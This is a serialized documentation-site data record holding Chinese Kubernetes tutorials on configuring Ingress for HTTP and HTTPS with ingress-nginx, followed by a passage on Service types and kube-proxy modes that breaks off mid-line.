Ingress介绍及使用",frontmatter:{title:"kubernetes(十) Ingress介绍及使用",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/609.kubernetes(%E5%8D%81)%20Ingress%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"04.运维/60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.md",key:"v-145b2bd8",path:"/kubernetes/609/",headers:[{level:2,title:"Ingress介绍",slug:"ingress介绍",normalizedTitle:"ingress 介绍",charIndex:2},{level:2,title:"Ingress使用",slug:"ingress使用",normalizedTitle:"ingress 使用",charIndex:895},{level:3,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:910},{level:3,title:"Http代理",slug:"http代理",normalizedTitle:"http 代理",charIndex:3972},{level:3,title:"Https代理",slug:"https代理",normalizedTitle:"https 代理",charIndex:5317}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Ingress介绍 Ingress使用 环境准备 Http代理 Https代理",content:'# Ingress 介绍\n\n在前面课程中已经提到，Service 对集群之外暴露服务的主要方式有两种：NotePort 和 LoadBalancer，但是这两种方式，都有一定的缺点：\n\n * NodePort 方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显\n * LB 方式的缺点是每个 service 需要一个 LB，浪费、麻烦，并且需要 kubernetes 之外设备的支持\n\n基于这种现状，kubernetes 提供了 Ingress 资源对象，Ingress 只需要一个 NodePort 或者一个 LB 就可以满足暴露多个 Service 的需求。工作机制大致如下图表示：\n\n\n\n实际上，Ingress 相当于一个 7 层的负载均衡器，是 kubernetes 对反向代理的一个抽象，它的工作原理类似于 Nginx，可以理解成在 Ingress 里建立诸多映射规则，Ingress Controller 通过监听这些配置规则并转化成 Nginx 的反向代理配置，然后对外部提供服务。在这里有两个核心概念：\n\n * ingress：kubernetes 中的一个对象，作用是定义请求如何转发到 service 的规则\n * ingress controller：具体实现反向代理及负载均衡的程序，对 ingress 定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如 Nginx, Contour, Haproxy 等等\n\nIngress（以 Nginx 为例）的工作原理如下：\n\n 1. 用户编写 Ingress 规则，说明哪个域名对应 kubernetes 集群中的哪个 Service\n 2. Ingress 控制器动态感知 Ingress 服务规则的变化，然后生成一段对应的 Nginx 反向代理配置\n 3. Ingress 控制器会将生成的 Nginx 配置写入到一个运行着的 Nginx 服务中，并动态更新\n 4. 到此为止，其实真正在工作的就是一个 Nginx 了，内部配置了用户定义的请求转发规则\n\n\n\n\n# Ingress 使用\n\n\n# 环境准备\n\n搭建 ingress 环境\n\n# 创建文件夹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# 获取ingress-nginx，本次案例使用的是0.30版本\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# 修改mandatory.yaml文件中的仓库\n# 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 创建ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# 查看ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nNAME                                           READY   STATUS    RESTARTS   AGE\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     Running   0          12h\n\n# 查看service\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nNAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\ningress-nginx   NodePort   10.98.75.163   <none>        80:32240/TCP,443:31335/TCP   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n准备 service 和 pod\n为了后面的实验比较方便，创建如下图所示的模型\n\n\n\n创建 tomcat-nginx.yaml\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n---\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerPort: 8080\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 8080\n    targetPort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# 查看\n[root@k8s-master01 ~]# kubectl get svc -n dev\nNAME             TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE\nnginx-service    ClusterIP   None         <none>        80/TCP     48s\ntomcat-service   ClusterIP   None         <none>        8080/TCP   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# Http 代理\n\n创建 ingress-http.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nNAME           HOSTS                                  ADDRESS   PORTS   AGE\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nRules:\nHost                Path  Backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# 接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上\n# 然后,就可以分别访问tomcat.itheima.com:32240  和  nginx.itheima.com:32240 查看效果了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Https 代理\n\n创建证书\n\n# 生成证书\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com"\n\n# 创建密钥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\n创建 ingress-https.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretName: tls-secret # 指定秘钥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nNAME            HOSTS                                  ADDRESS         PORTS     AGE\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\nTLS:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nRules:\nHost              Path Backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# 下面可以通过浏览器访问https://nginx.itheima.com:31335 和 https://tomcat.itheima.com:31335来查看了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'# ingress 介绍\n\n在前面课程中已经提到，service 对集群之外暴露服务的主要方式有两种：noteport 和 loadbalancer，但是这两种方式，都有一定的缺点：\n\n * nodeport 方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显\n * lb 方式的缺点是每个 service 需要一个 lb，浪费、麻烦，并且需要 kubernetes 之外设备的支持\n\n基于这种现状，kubernetes 提供了 ingress 资源对象，ingress 只需要一个 nodeport 或者一个 lb 就可以满足暴露多个 service 的需求。工作机制大致如下图表示：\n\n\n\n实际上，ingress 相当于一个 7 层的负载均衡器，是 kubernetes 对反向代理的一个抽象，它的工作原理类似于 nginx，可以理解成在 ingress 里建立诸多映射规则，ingress controller 通过监听这些配置规则并转化成 nginx 的反向代理配置，然后对外部提供服务。在这里有两个核心概念：\n\n * ingress：kubernetes 中的一个对象，作用是定义请求如何转发到 service 的规则\n * ingress controller：具体实现反向代理及负载均衡的程序，对 ingress 定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如 nginx, contour, haproxy 等等\n\ningress（以 nginx 为例）的工作原理如下：\n\n 1. 用户编写 ingress 规则，说明哪个域名对应 kubernetes 集群中的哪个 service\n 2. ingress 控制器动态感知 ingress 服务规则的变化，然后生成一段对应的 nginx 反向代理配置\n 3. ingress 控制器会将生成的 nginx 配置写入到一个运行着的 nginx 服务中，并动态更新\n 4. 到此为止，其实真正在工作的就是一个 nginx 了，内部配置了用户定义的请求转发规则\n\n\n\n\n# ingress 使用\n\n\n# 环境准备\n\n搭建 ingress 环境\n\n# 创建文件夹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# 获取ingress-nginx，本次案例使用的是0.30版本\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# 修改mandatory.yaml文件中的仓库\n# 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 创建ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# 查看ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nname                                           ready   status    restarts   age\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     running   0          12h\n\n# 查看service\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nname            type       cluster-ip     external-ip   port(s)                      age\ningress-nginx   nodeport   10.98.75.163   <none>        80:32240/tcp,443:31335/tcp   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n准备 service 和 pod\n为了后面的实验比较方便，创建如下图所示的模型\n\n\n\n创建 tomcat-nginx.yaml\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n---\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerport: 8080\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 80\n    targetport: 80\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 8080\n    targetport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# 查看\n[root@k8s-master01 ~]# kubectl get svc -n dev\nname             type        cluster-ip   external-ip   port(s)    age\nnginx-service    clusterip   none         <none>        80/tcp     48s\ntomcat-service   clusterip   none         <none>        8080/tcp   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# http 代理\n\n创建 ingress-http.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nname           hosts                                  address   ports   age\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nrules:\nhost                path  backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# 接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上\n# 然后,就可以分别访问tomcat.itheima.com:32240  和  nginx.itheima.com:32240 查看效果了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# https 代理\n\n创建证书\n\n# 生成证书\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/c=cn/st=bj/l=bj/o=nginx/cn=itheima.com"\n\n# 创建密钥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\n创建 ingress-https.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretname: tls-secret # 指定秘钥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nname            hosts                                  address         ports     age\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\ntls:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nrules:\nhost              path backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# 下面可以通过浏览器访问https://nginx.itheima.com:31335 和 https://tomcat.itheima.com:31335来查看了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0}},{title:"kubernetes(九) Service介绍、类型及使用",frontmatter:{title:"kubernetes(九) Service介绍、类型及使用",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/608.kubernetes(%E4%B9%9D)%20Service%E4%BB%8B%E7%BB%8D%E3%80%81%E7%B1%BB%E5%9E%8B%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"04.运维/60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.md",key:"v-3701b2bc",path:"/kubernetes/608/",headers:[{level:2,title:"Service介绍",slug:"service介绍",normalizedTitle:"service 介绍",charIndex:2},{level:2,title:"Service类型",slug:"service类型",normalizedTitle:"service 类型",charIndex:2300},{level:2,title:"Service使用",slug:"service使用",normalizedTitle:"service 使用",charIndex:3026},{level:3,title:"实验环境准备",slug:"实验环境准备",normalizedTitle:"实验环境准备",charIndex:3041},{level:3,title:"ClusterIP类型的Service",slug:"clusterip类型的service",normalizedTitle:"clusterip 类型的 service",charIndex:4475},{level:3,title:"HeadLiness类型的Service",slug:"headliness类型的service",normalizedTitle:"headliness 类型的 service",charIndex:7662},{level:3,title:"NodePort类型的Service",slug:"nodeport类型的service",normalizedTitle:"nodeport 类型的 service",charIndex:9573},{level:3,title:"LoadBalancer类型的Service",slug:"loadbalancer类型的service",normalizedTitle:"loadbalancer 类型的 service",charIndex:10529},{level:3,title:"ExternalName类型的Service",slug:"externalname类型的service",normalizedTitle:"externalname 类型的 service",charIndex:10687}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Service介绍 Service类型 Service使用 实验环境准备 ClusterIP类型的Service HeadLiness类型的Service NodePort类型的Service LoadBalancer类型的Service ExternalName类型的Service",content:'# Service 介绍\n\n在 kubernetes 中，pod 是应用程序的载体，我们可以通过 pod 的 ip 来访问应用程序，但是 pod 的 ip 地址不是固定的，这也就意味着不方便直接采用 pod 的 ip 对服务进行访问。\n\n为了解决这个问题，kubernetes 提供了 Service 资源，Service 会对提供同一个服务的多个 pod 进行聚合，并且提供一个统一的入口地址。通过访问 Service 的入口地址就能访问到后面的 pod 服务。\n\n\n\nService 在很多情况下只是一个概念，真正起作用的其实是 kube-proxy 服务进程，每个 Node 节点上都运行着一个 kube-proxy 服务进程。当创建 Service 的时候会通过 api-server 向 etcd 写入创建的 service 的信息，而 kube-proxy 会基于监听的机制发现这种 Service 的变动，然后它会将最新的 Service 信息转换成对应的访问规则。\n\n\n\n规则有 iptables，ipvs 等，简单介绍下 ipvs 规则\n\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 是 service 提供的访问入口，当访问这个入口的时候，可以发现后面有三个 pod 的服务在等待调用，kube-proxy 会基于 rr（轮询）的策略，将请求分发到其中一个 pod 上去，这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。\n\nkube-proxy 目前支持三种工作模式:\nuserspace 模式\nuserspace 模式下，kube-proxy 会为每一个 Service 创建一个监听端口，发向 Cluster IP 的请求被 Iptables 规则重定向到 kube-proxy 监听的端口上，kube-proxy 根据 LB 算法选择一个提供服务的 Pod 并和其建立链接，以将请求转发到 Pod 上。 该模式下，kube-proxy 充当了一个四层负责均衡器的角色。由于 kube-proxy 运行在 userspace 中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。\n\n\n\niptables 模式\niptables 模式下，kube-proxy 为 service 后端的每个 Pod 创建对应的 iptables 规则，直接将发向 Cluster IP 的请求重定向到一个 Pod IP。 该模式下 kube-proxy 不承担四层负责均衡器的角色，只负责创建 iptables 规则。该模式的优点是较 userspace 模式效率更高，但不能提供灵活的 LB 策略，当后端 Pod 不可用时也无法进行重试。\n\n\n\nipvs 模式\nipvs 模式和 iptables 类似，kube-proxy 监控 Pod 的变化并创建相应的 ipvs 规则。ipvs 相对 iptables 转发效率更高。除此以外，ipvs 支持更多的 LB 算法。\n\n\n\n此模式必须安装 ipvs 内核模块，否则会降级为 iptables，开启 ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# 修改mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# Service 类型\n\nService 的资源清单文件：\n\nkind: Service  # 资源类型\napiVersion: v1  # 资源版本\nmetadata: # 元数据\n  name: service # 资源名称\n  namespace: dev # 命名空间\nspec: # 描述\n  selector: # 标签选择器，用于确定当前service代理哪些pod\n    app: nginx\n  type: # Service类型，指定service的访问方式\n  clusterIP:  # 虚拟服务的ip地址\n  sessionAffinity: # session亲和性，支持ClientIP、None两个选项，可以把同一个源的请求，发到一个具体的Pod上\n  ports: # 端口信息\n    - protocol: TCP \n      port: 3017  # service端口\n      targetPort: 5003 # pod端口\n      nodePort: 31122 # 主机端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntype：\n\n * ClusterIP：默认值，它是 Kubernetes 系统自动分配的虚拟 IP，只能在集群内部访问\n * NodePort：将 Service 通过指定的 Node 上的端口暴露给外部，通过此方法，就可以在集群外部访问服务\n * LoadBalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持\n * ExternalName： 把集群外部的服务引入集群内部，直接使用\n\n\n# Service 使用\n\n\n# 实验环境准备\n\n在使用 service 之前，首先利用 Deployment 创建出 3 个 pod，注意要为 pod 设置 app=nginx-pod 的标签\n创建 deployment.yaml，内容如下：\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                             READY   STATUS     IP            NODE     LABELS\npc-deployment-66cb59b984-8p84h   1/1     Running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     Running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     Running    10.244.1.40   node1    app=nginx-pod\n\n# 为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的IP地址不一致）\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#修改完毕之后，访问测试\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# ClusterIP 类型的 Service\n\n是集群内部地址，只能通过 Node 集群内部访问，创建 service-clusterip.yaml 文件\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: 10.97.97.97 # service的ip地址，如果不写，默认会生成一个\n  type: ClusterIP\n  ports:\n  - port: 80  # Service端口       \n    targetPort: 80 # pod端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-clusterip   ClusterIP   10.97.97.97   <none>        80/TCP    13s   app=nginx-pod\n\n# 查看service的详细信息\n# 在这里有一个Endpoints列表，里面就是当前service可以负载到的服务入口\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nName:              service-clusterip\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                10.97.97.97\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# 查看ipvs的映射规则\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# 访问10.97.97.97:80观察效果\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nEndpoint\n\nEndpoint 是 kubernetes 中的一个资源对象，存储在 etcd 中，用来记录一个 service 对应的所有 pod 的访问地址，它是根据 service 配置文件中 selector 描述产生的。\n\n一个 Service 由一组 Pod 组成，这些 Pod 通过 Endpoints 暴露出来，Endpoints 是实现实际服务的端点集合。换句话说，service 和 pod 之间的联系是通过 endpoints 实现的。\n\n\n\n负载分发策略\n对 Service 的访问被分发到了后端的 Pod 上去，目前 kubernetes 提供了两种负载分发策略：\n\n * 如果不定义，默认使用 kube-proxy 的策略，比如随机、轮询\n * 基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个 Pod 上\n   此模式可以使在 spec 中添加 sessionAffinity:ClientIP 选项\n\n# 查看ipvs的映射规则【rr 轮询】\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          